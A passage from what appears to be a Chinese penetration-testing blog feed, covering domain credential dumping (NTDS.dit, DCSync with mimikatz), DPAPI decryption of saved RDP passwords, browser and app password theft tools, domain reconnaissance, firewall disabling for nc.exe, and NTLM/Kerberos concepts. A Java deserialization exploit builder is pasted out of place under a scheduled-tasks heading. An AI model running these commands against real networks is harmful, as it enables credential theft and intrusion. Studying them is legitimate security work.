class="headerlink" title="离线读取NTDS文件中的Hash值"></a>离线读取NTDS文件中的Hash值</h2><p>system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><pre class="language-none"><code class="language-none">reg save hklm\system c:\User\admin\Desktop\system.hive</code></pre><ol><li><font color="red">secretsdump.exe 工具读取</font></li></ol><pre class="language-none"><code class="language-none">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</code></pre><ol start="2"><li><font color="red">NTDSDumpEx.exe工具读取</font></li></ol><pre class="language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o 1.txt</code></pre><h2 id="在线读取NTDS文件中的Hash值"><a href="#在线读取NTDS文件中的Hash值" class="headerlink" title="在线读取NTDS文件中的Hash值"></a>在线读取NTDS文件中的Hash值</h2><ol><li><font color="red">MimiKatz</font></li></ol><pre class="language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:abc.com &#x2F;all &#x2F;csv(读取所有)lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:administrator（读取单个用户）</code></pre><ol start="2"><li><p><font color="red">QuarksPWDump工具</font></p></li><li><p><font color="red">secretsdump工具</font></p></li><li><p><font color="red">Invoke-DCSync.ps1工具</font></p></li></ol><h2 id="Dcsync原理以及攻击"><a href="#Dcsync原理以及攻击" class="headerlink" title="Dcsync原理以及攻击"></a>Dcsync原理以及攻击</h2><p><strong>什么是DCsync</strong>：</p><p>在内网中一般不是一个域控，会有域树或者域森林等，域控之间是要同步数据的,不同的域控15分钟之间要发起一次数据同步的请求，请求里面就包含同步的数据，这里采用的协议是DRS(目录复制服务)，这个就是DCsync</p><p><strong>运行这个DRS服务，运行用户：</strong></p><pre class="language-none"><code class="language-none">1. Administrators组内的用户2. Domain Admins组内的用户3. Enterprise Admins组内的用户4. 域控制器的计算机帐户</code></pre><p>域控的Administrator 和 system 也可以</p><p><strong>前提:</strong></p><p>远程读取是利用dcsync，所以前提是必须找到拥有运行dcsync的账号，即上面的运行用户，还有一种是域控配置不当对普通账户的属性里面勾选了**<font color="red">“使用可逆加密存储密码的属性“</font>**</p><p>1、找到拥有dcsync的用户</p><p>2、远程读取即可</p><p><strong>读取方式：</strong></p><ol><li><font color="red">mimikatz</font></li></ol><pre class="language-none"><code class="language-none">命令:lsadump::dcsync &#x2F;domain:abc.com &#x2F;all &#x2F;csv(读取所有)lsadump::dcsync &#x2F;domain:abc.com &#x2F;user:administrator（读取单个用户）</code></pre><ol start="2"><li><font color="red">secretsdump工具</font></li></ol><pre class="language-none"><code class="language-none">命令: secretsdump.exe 域名&#x2F;用户名或者hash:密码@IP</code></pre><h1 id="RDP明文密码抓取"><a href="#RDP明文密码抓取" class="headerlink" title="RDP明文密码抓取"></a>RDP明文密码抓取</h1><p>远程连接时勾选了”记住我的凭据”，这时就保存了密码。这个过程是可逆，所以我们可以将保存的密码</p><p>进行还原</p><blockquote><p>原理：Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密使用这个密码，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来</p></blockquote><p><strong>查看凭据的方法</strong></p><pre class="language-none"><code class="language-none">1、查看mstsc的连接记录命令：cmdkey &#x2F;list2、查找本地的Credentials命令：dir &#x2F;a %userprofile%\appdata\local\microsoft\credentials\*</code></pre><p><strong>在线读取凭据密码</strong></p><pre class="language-none"><code class="language-none">1. 使用mimikatz获取该文件的MasterKey的guid命令: mimikatz dpapi::cred &#x2F;in:凭据绝对路径(C:\User\admin\appdata&#x2F;local&#x2F;microsoft\credentials\凭据文件名)记住guidmasterkey2、找到内存中对应的MasterKey命令： mimikatz sekurlsa::dpapi查找上面记住的guid对应的MasterKey3、最后打开mimikatz通过MasterKey值去解密凭据文件命令： dpapi::cred &#x2F;in:凭据文件路径 &#x2F;masterkey:masterkey值</code></pre><p>离线读取</p><pre class="language-none"><code class="language-none">1、下载目标lsass内存https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_18193739&#x2F;article&#x2F;details&#x2F;1321724752、下载凭据到本地3、用mimikatz载入dump回来的内存命令： mimikatz Sekurlsa::minidump lsass.dump其余和上面一样</code></pre><h1 id="系统应用密码抓取"><a href="#系统应用密码抓取" class="headerlink" title="系统应用密码抓取"></a>系统应用密码抓取</h1><h2 id="浏览器密码抓取"><a href="#浏览器密码抓取" class="headerlink" title="浏览器密码抓取"></a>浏览器密码抓取</h2><ol><li><font color="red">Sharp-HackBrowserData工具</font></li></ol><p>直接运行</p><ol start="2"><li>、<font color="red">BrowserGhost等</font></li></ol><p>CS插件自带</p><h2 id="其他软件密码抓取"><a href="#其他软件密码抓取" class="headerlink" title="其他软件密码抓取"></a>其他软件密码抓取</h2><ol><li><font color="red">SharpDecryptPwd数据库</font></li></ol><p>SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包</p><p>Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品</p><ol start="2"><li><font color="red">LaZagne各类密码</font></li></ol><p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明</p><p>⽂、API、⾃定义算法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这</p><p>些密码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透信息收集</title>
      <link href="/2024/11/11/2024-09-29-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/11/11/2024-09-29-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h1><h4 id="收集网卡信息"><a href="#收集网卡信息" class="headerlink" title="收集网卡信息"></a>收集网卡信息</h4><p><code>ipconfig</code></p><h4 id="收集电脑版本和补丁"><a href="#收集电脑版本和补丁" class="headerlink" title="收集电脑版本和补丁"></a>收集电脑版本和补丁</h4><p><code>systeminfo</code></p><h4 id="查看系统体系结构-X86-AMD64"><a href="#查看系统体系结构-X86-AMD64" class="headerlink" title="查看系统体系结构(X86,AMD64)"></a>查看系统体系结构(X86,AMD64)</h4><p><code>echo %PROCESSOR_ARCHITECTURE%</code>d</p><h4 id="查看安装的软件和版本"><a href="#查看安装的软件和版本" class="headerlink" title="查看安装的软件和版本"></a>查看安装的软件和版本</h4><p><code>wmic product get name,version</code></p><p><code>powershell &quot;Get-WmiObject -class win32_product | Select-Object -Property name,version&quot;</code></p><h4 id="本机运行的服务"><a href="#本机运行的服务" class="headerlink" title="本机运行的服务"></a>本机运行的服务</h4><p><code>wmic service list brief</code></p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><p><code>tasklist</code>、<code>wmic process list brief</code></p><h4 id="查看自启程序"><a href="#查看自启程序" class="headerlink" title="查看自启程序"></a>查看自启程序</h4><p><code>wmic startup get command,caption</code></p><h4 id="查看计划任务-如果提示无法加载资源-输入chcp-437"><a href="#查看计划任务-如果提示无法加载资源-输入chcp-437" class="headerlink" title="查看计划任务(如果提示无法加载资源,输入chcp 437)"></a>查看计划任务(如果提示无法加载资源,输入chcp 437)</h4><p>xxxxxxxxxx package com.ezgame.ctf.tools;​import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;​public class EXP {    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException {        ToStringBean toStringBean &#x3D; new ToStringBean();        Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(“ClassByte”);        declaredField.setAccessible(true);​        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(“D:\桌面\note\ClassLoaderTest.class\“));        declaredField.set(toStringBean, bytes);​        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传​        Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(“val”);        declaredField1.setAccessible(true);        declaredField1.set(badAttributeValueExpException, toStringBean);​        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeUTF(“gadgets”);        objectOutputStream.writeInt(2021);        objectOutputStream.writeObject(badAttributeValueExpException);​        byte[] byteArray &#x3D; byteArrayOutputStream.toByteArray();        String bytes1 &#x3D; Tools.base64Encode(byteArray);        System.out.println(bytes1);    }​}Java</p><h4 id="查看开机时间"><a href="#查看开机时间" class="headerlink" title="查看开机时间"></a>查看开机时间</h4><p><code>net statistics workstation</code></p><h4 id="用户列表信息"><a href="#用户列表信息" class="headerlink" title="用户列表信息"></a>用户列表信息</h4><p><code>wmic useraccount get name,SID</code>、<code>net user</code></p><h4 id="查询端口信息"><a href="#查询端口信息" class="headerlink" title="查询端口信息"></a>查询端口信息</h4><p><code>netstat -ano</code> </p><h4 id="查询补丁信息"><a href="#查询补丁信息" class="headerlink" title="查询补丁信息"></a>查询补丁信息</h4><p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code>、<code>systeminfo</code></p><h4 id="查询杀软信息"><a href="#查询杀软信息" class="headerlink" title="查询杀软信息"></a>查询杀软信息</h4><p><code>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</code></p><h4 id="查询共享列表"><a href="#查询共享列表" class="headerlink" title="查询共享列表"></a>查询共享列表</h4><p><code>wmic share get name,path,status</code>、<code>net share</code></p><h4 id="查询路由信息"><a href="#查询路由信息" class="headerlink" title="查询路由信息"></a>查询路由信息</h4><p><code>route print</code></p><h4 id="查询是否开启防火墙"><a href="#查询是否开启防火墙" class="headerlink" title="查询是否开启防火墙"></a>查询是否开启防火墙</h4><p><code>netsh firewall show state</code></p><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows server 2003: <code>netsh firewall set opmode disable</code></p><p>Windows server 2003之后: <code>netsh firewall set opmode disable</code> 或者<code>etsh advfirewall set allprofiles state off</code></p><h4 id="指定连接"><a href="#指定连接" class="headerlink" title="指定连接"></a>指定连接</h4><p>2003及之前的版本,允许指定的程序进行全部的连接</p><p><code>netsh firewall add allowedprogram c:\nc.exe &quot;allownc&quot; enable</code></p><p>2003之后的版本，允许指定的程序进行全部的连接</p><p><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot;dir=in action=allow program=&quot;C:\nc.exe&quot; </code></p><p>允许指定程序退出,命令如下</p><p><code>netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot; </code></p><p>允许3389端口放行,命令如下</p><p><code>netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p><h4 id="收集本机的WIFI密码信息"><a href="#收集本机的WIFI密码信息" class="headerlink" title="收集本机的WIFI密码信息"></a>收集本机的WIFI密码信息</h4><p><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></p><h4 id="查询RDP端口"><a href="#查询RDP端口" class="headerlink" title="查询RDP端口"></a>查询RDP端口</h4><p><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; /V PortNumber</code></p><h4 id="查询当前保存的凭据"><a href="#查询当前保存的凭据" class="headerlink" title="查询当前保存的凭据"></a>查询当前保存的凭据</h4><p><code>cmdkey /l</code></p><h4 id="arp信息"><a href="#arp信息" class="headerlink" title="arp信息"></a>arp信息</h4><p><code>arp -a</code></p><h4 id="查询最近打开的文件"><a href="#查询最近打开的文件" class="headerlink" title="查询最近打开的文件"></a>查询最近打开的文件</h4><p><code>dir %APPDATA%\Microsoft\Windows\Recent</code></p><h4 id="查询本地工作组"><a href="#查询本地工作组" class="headerlink" title="查询本地工作组"></a>查询本地工作组</h4><p><code>net localgroup</code></p><h4 id="查询管理员组员信息"><a href="#查询管理员组员信息" class="headerlink" title="查询管理员组员信息"></a>查询管理员组员信息</h4><p><code>net localgroup administrators(组名)</code></p><h4 id="查询RDP凭据"><a href="#查询RDP凭据" class="headerlink" title="查询RDP凭据"></a>查询RDP凭据</h4><p><code>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code></p><h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h4 id="查询是否为域用户"><a href="#查询是否为域用户" class="headerlink" title="查询是否为域用户"></a>查询是否为域用户</h4><p><code>hostname</code>查看机器名,<code>whoami</code>命令搭配<code>hostname</code>可以查看是否是域用户</p><h4 id="判断域存在"><a href="#判断域存在" class="headerlink" title="判断域存在"></a>判断域存在</h4><pre class="language-none"><code class="language-none">ipconfig &#x2F;allsysteminfonet config workstationnet time &#x2F;domain</code></pre><h4 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h4><p><code>net view/domain:域名</code></p><h4 id="查询域内所有用户组列表"><a href="#查询域内所有用户组列表" class="headerlink" title="查询域内所有用户组列表"></a>查询域内所有用户组列表</h4><p><code>net group /domain</code></p><h4 id="查询组内所有域成员计算机列表"><a href="#查询组内所有域成员计算机列表" class="headerlink" title="查询组内所有域成员计算机列表"></a>查询组内所有域成员计算机列表</h4><p><code>net group &quot;domain computers&quot; /domain</code></p><h4 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h4><p><code>nltest /domain_trusts</code></p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p><code>ping 域控制器名.域名</code>命令获取</p><p><code>ping dc.test.local</code></p><h4 id="查看域控制器机器名"><a href="#查看域控制器机器名" class="headerlink" title="查看域控制器机器名"></a>查看域控制器机器名</h4><p><code>nltest /DCLIST:(域名)</code></p><p><code>nslookup -type=SRV _ldap._tcp</code></p><p><code>net time /domain</code></p><h4 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h4><p><code>net group &quot;Domain Controllers&quot; /domain</code></p><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><h4 id="查询远程计算机上当前已登录用户"><a href="#查询远程计算机上当前已登录用户" class="headerlink" title="查询远程计算机上当前已登录用户"></a>查询远程计算机上当前已登录用户</h4><p><code>PsLoggedon.exe -l \\远程计算机名</code></p><h4 id="显示域中所有计算机上当前登陆的所有用户"><a href="#显示域中所有计算机上当前登陆的所有用户" class="headerlink" title="显示域中所有计算机上当前登陆的所有用户"></a>显示域中所有计算机上当前登陆的所有用户</h4><p><code>PVEFindADUser.exe -current</code></p><h4 id="找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户"><a href="#找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户" class="headerlink" title="找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户"></a>找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户</h4><p><code>netview.exe -d</code></p><h3 id="敏感数据定位"><a href="#敏感数据定位" class="headerlink" title="敏感数据定位"></a>敏感数据定位</h3><pre class="language-none"><code class="language-none">1.指定目录下搜集各类敏感文件dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.txt&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.xml&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdb&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.sql&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdf&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.eml&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.pst&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*conf*&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*bak*&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pwd*&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pass*&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*login*&quot;dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*user*&quot;2.指定目录下的文件中搜集各种账号密码findstr &#x2F;s &#x2F;i &quot;pass&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;s &#x2F;i &quot;user&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;s &#x2F;i &quot;pwd&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;s &#x2F;i &quot;login&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;s &#x2F;i &quot;user&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</code></pre><h3 id="内网IP扫描"><a href="#内网IP扫描" class="headerlink" title="内网IP扫描"></a>内网IP扫描</h3><h4 id="批量ping-C段命令"><a href="#批量ping-C段命令" class="headerlink" title="批量ping C段命令"></a>批量ping C段命令</h4><pre class="language-none"><code class="language-none">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL&#x3D;“</code></pre><h4 id="fping工具"><a href="#fping工具" class="headerlink" title="fping工具"></a>fping工具</h4><pre class="language-none"><code class="language-none">fping IP1 IP2 -c 10 扫描多个IP 10次fping -a -g 172.18.9.0&#x2F;24 扫描C端IP</code></pre><h4 id="Arp批量扫描"><a href="#Arp批量扫描" class="headerlink" title="Arp批量扫描"></a>Arp批量扫描</h4><pre class="language-none"><code class="language-none">Apr.exe -t IP段Apr.exe -t 192.168.1.0&#x2F;24</code></pre><h4 id="NETBIOS协议扫描"><a href="#NETBIOS协议扫描" class="headerlink" title="NETBIOS协议扫描"></a>NETBIOS协议扫描</h4><pre class="language-none"><code class="language-none">nbtscan.exe + IP段nbtscan.exe + 192.16.1.0&#x2F;24</code></pre><h4 id="Fscan扫描"><a href="#Fscan扫描" class="headerlink" title="Fscan扫描"></a>Fscan扫描</h4><h4 id="Kscan扫描"><a href="#Kscan扫描" class="headerlink" title="Kscan扫描"></a>Kscan扫描</h4><pre class="language-none"><code class="language-none">可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解，且是go平台首款开源的RDP暴力破解工具</code></pre><h4 id="Lodon大型扫描器"><a href="#Lodon大型扫描器" class="headerlink" title="Lodon大型扫描器"></a>Lodon大型扫描器</h4><pre class="language-none"><code class="language-none">Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段&#x2F;B段&#x2F;C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB&#x2F;IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe&#x2F;psexec&#x2F;atexec&#x2F;sshexec&#x2F;jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#&#x2F;Delphi&#x2F;VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</code></pre><h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><h4 id="ScanLine工具扫描"><a href="#ScanLine工具扫描" class="headerlink" title="ScanLine工具扫描"></a>ScanLine工具扫描</h4><h4 id="Telnet协议扫描"><a href="#Telnet协议扫描" class="headerlink" title="Telnet协议扫描"></a>Telnet协议扫描</h4><pre class="language-none"><code class="language-none">telnet + IP+端口</code></pre><h4 id="Fsacn、Kscan等"><a href="#Fsacn、Kscan等" class="headerlink" title="Fsacn、Kscan等"></a>Fsacn、Kscan等</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网域知识</title>
      <link href="/2024/11/11/2024-09-28-%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/11/11/2024-09-28-%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><h4 id="单向域信任"><a href="#单向域信任" class="headerlink" title="单向域信任"></a>单向域信任</h4><pre class="language-none"><code class="language-none">单向信任是在两个域之间创建的单向信任。这表示在域A和域B之间的单向信任中,1、域A中的用户可以访问域B中的资源。2、域B中的用户无法访问域A中的资源。单向信任可以是不可传递信任,也可以是可传递信任,这取决于创建的信任类型</code></pre><h4 id="双向域信任"><a href="#双向域信任" class="headerlink" title="双向域信任"></a>双向域信任</h4><pre class="language-none"><code class="language-none">林（域树）中的所有域信任都是双向的、可传递的信任。创建新的子域时，系统将在新的子域和父域之间自动创建双向可传递信任。在双向信任中，域A信任域B，并且域B信任域A。这表示可以在两个域之间双向传递身份验证请求。</code></pre><p>因此入侵子域后，可轻易入侵父域。反之亦然。</p><h4 id="内部信任"><a href="#内部信任" class="headerlink" title="内部信任"></a>内部信任</h4><pre class="language-none"><code class="language-none">内部信任是指在同一个林中域之间的信任关系,这种信任关系是可传递的</code></pre><h4 id="外部信任"><a href="#外部信任" class="headerlink" title="外部信任"></a>外部信任</h4><pre class="language-none"><code class="language-none">外部信任指不同林之间域的信任关系,这种信任关系是单向或者双向不可传递的</code></pre><h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>本地最高管理员是administrator,其余用户就算隶属于administrator组也是普通管理员。也不能直接运行一些高权限操作,因为存在UAC认证。必须右键以管理员身份运行才能执行高权限命令。</p><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p><img src="/%5Cimages%5Cposts%5C%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86%5Cimage-20240928192904804.png"></p><p>Win+R —msconfig–&gt;工具–&gt;启动可以设置UAC</p><p><img src="/%5Cimages%5Cposts%5C%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86%5Cimage-20240928193225766.png"></p><h2 id="域内用户组"><a href="#域内用户组" class="headerlink" title="域内用户组"></a>域内用户组</h2><h4 id="域管理员组-Domain-Admins"><a href="#域管理员组-Domain-Admins" class="headerlink" title="域管理员组(Domain Admins)"></a>域管理员组(Domain Admins)</h4><blockquote><p>域管理员组(Domain Admins)指定的域管理员拥有完整的管理员权限。因为改组会被添加到自己所在域的Administrator组中，因此可以继承Administrator组的所有权限。同时该组默认会被添加到每台域成员计算机的本地Administrator组中，这样Domain admins组就获得了域中所有计算机的所有权</p></blockquote><p>但是Domain admins是普通管理员权限</p><h4 id="企业系统管理员组-Enterprise-Admins"><a href="#企业系统管理员组-Enterprise-Admins" class="headerlink" title="企业系统管理员组(Enterprise Admins)"></a>企业系统管理员组(Enterprise Admins)</h4><p>如果添加一个域管理员，是添加到Domain Admins组里面</p><blockquote><p>企业系统管理员组(Enterprise Admins)是域森林或者根域中的一个组。该组在域森林中的每个域内都是Administrator组的成员，对所有域控制器都有完全访问权</p></blockquote><p>添加域控的管理员，就添加到Enterprise Admins组</p><h4 id="域用户组-Domain-users"><a href="#域用户组-Domain-users" class="headerlink" title="域用户组(Domain users)"></a>域用户组(Domain users)</h4><p>域用户组(Domain users)中是所有的域成员。在默认情况下，任何由我们建立的用户账户都属于Domain Users组，该组在域内机器中存在于Users组</p><h4 id="Domain-Computer组"><a href="#Domain-Computer组" class="headerlink" title="Domain Computer组"></a>Domain Computer组</h4><p>任何由我们建立的计算机账号都属于该组</p><h2 id="机器用户和SYSTEM"><a href="#机器用户和SYSTEM" class="headerlink" title="机器用户和SYSTEM"></a>机器用户和SYSTEM</h2><blockquote><p>当电脑加入到域中后机器账号的密码会同步到域控上，所以本地system用户对应域内的机器用户</p></blockquote><p>所以如果渗透获取到的是机器用户(本地用户登录)，可以提权到SYSTEM权限来进行域内信息收集</p><h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><p>winlogon.exe电脑开启 明文账号密码发送给Lsass.exe进程与 SAM文件对比</p><p><img src="/%5Cimages%5Cposts%5C%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86%5Cimage-20240928223204032.png"></p><h4 id="winlogon-exe"><a href="#winlogon-exe" class="headerlink" title="winlogon.exe"></a>winlogon.exe</h4><p>Windows Logon Process(winlogon.exe):是Windows NT用户登录程序，用于管理用户登录和推出。用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登录界面</p><h4 id="lsass-exe"><a href="#lsass-exe" class="headerlink" title="lsass.exe"></a>lsass.exe</h4><p>lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。这些策略包括密码策略、账户策略、用户权限、域策略等。同时还负责对用户进行身份验证，以确保只有授权的用户才能访问系统资源</p><ol><li>将winlogon传过来的明文账号密码进行加密，然后和SAM文件中的密文账号密码作对比。如果对比成功就登录成功</li><li>将收到的明文账号密码在本地内存中保留一份用作备用</li></ol><p>这里保留的一份就可以读取利用</p><h4 id="SAM文件"><a href="#SAM文件" class="headerlink" title="SAM文件"></a>SAM文件</h4><p>SAM文件位于<code>C:\windows\system32\config\</code>用于储存本地所有用户的凭证信息</p><p>可以用高权限查看进行破解</p><h2 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h2><p>密码的加密有LM-Hash和NTLM-Hash。</p><p>LM-Hash本质上是DES加密，NTLM-Hash是MD4加密</p><p>LM-Hash在server2008和Win7以后不使用，但支持。以后的版本是NTLM-Hash</p><p>如果LM-Hash被禁用，那么攻击者抓取到的LM-Hash为<code>aad3b435b51404eeaad3b435b51404ee</code></p><h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><h4 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h4><p>认证机制：1.协商 2.咨询 3.验证</p><ul><li>客户端向服务器发送一个请求</li><li>服务器接收到请求后，生成一个8-16位的Challenge(八位是Net-NTLMv1，十六位是Net-NTLMv2)保存到本地，发送回客户端</li><li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li><li>服务器校验response</li></ul><p><strong>NTLM协议安全问题</strong></p><ol><li>PTH攻击：PTH认证过程中使用到用户的NTLM-hash值进行计算。如果知晓电脑Hash值就可以进行PTH攻击</li><li>NET-HTLM  hash relay攻击：NTLM中间人攻击。如果获得Net-NTML v1 Hash可重放，</li><li>Net-NTLM v1 v1Hash破解</li></ol><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h4><p>Kerberos是一种网络认证协议，是一种可信任的第三方认证服务</p><p>Kerberos存在三个角色：</p><ol><li>客户端(Client)：发送请求的一方</li><li>客户端(Server)：接收请求的一方</li><li>密钥分发中心(KDC)：分为两部分</li></ol><p>​AS：认证服务器，专门用来认证客户端的身份并发放可互用于访问TGS的TGT</p><p>​TGS：票据授予服务器，用来发放整个认证过程以及客户端访问的服务端时所需的服务授予票据</p><p>完整流程：</p><blockquote><ol><li>客户端向KDC的AS认证服务请求TGT票据</li><li>客户端通过AS认证后，KDC将会给客户端发放TGT票据</li><li>客户端带上TGT票据，向TGS认证服务请求ST服务票据</li><li>客户端通过TGS认证后，TGS将会给客户端发放ST服务票据</li><li>客户端使用ST服务票据向服务端请求服务</li><li>PAC校验：服务端拿到PAC询问KDC客户端是否有权限，KDC将客户端的权限信息返回给服务端，判断客户端是否有权限访问该服务，并把结果返回给客户端</li></ol></blockquote><p><strong>伪造TGT就是黄金票据，伪造ST就是白银票据</strong></p><p>黄金票据作用更大，白银票据伪造需要知晓对方机器的密码</p><p>Kerberos协议安全问题：</p><p><img src="/%5Cimages%5Cposts%5C%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86%5Cimage-20240929165856411.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场5</title>
      <link href="/2024/11/11/2024-09-28-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/"/>
